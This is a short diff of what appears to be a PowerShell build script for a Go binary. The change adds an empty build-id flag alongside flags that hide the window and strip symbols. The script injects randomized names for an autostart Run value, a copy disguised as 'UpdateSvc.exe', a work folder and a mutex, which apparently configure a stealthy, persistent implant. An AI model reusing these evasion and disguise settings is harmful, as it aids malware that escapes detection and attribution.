@@ -33,7 +33,7 @@ $mirror   = "UpdateSvc$rnd.exe"
 $workDir  = "HostCache$rnd"
 $mutex    = "Local\Instance$rnd"
 
-$ld = "-H windowsgui -s -w" +
+$ld = "-H windowsgui -s -w -buildid=" +
   " -X main.runValueName=$runName" +
   " -X main.mirrorFileName=$mirror" +
   " -X main.workDirName=$workDir" +
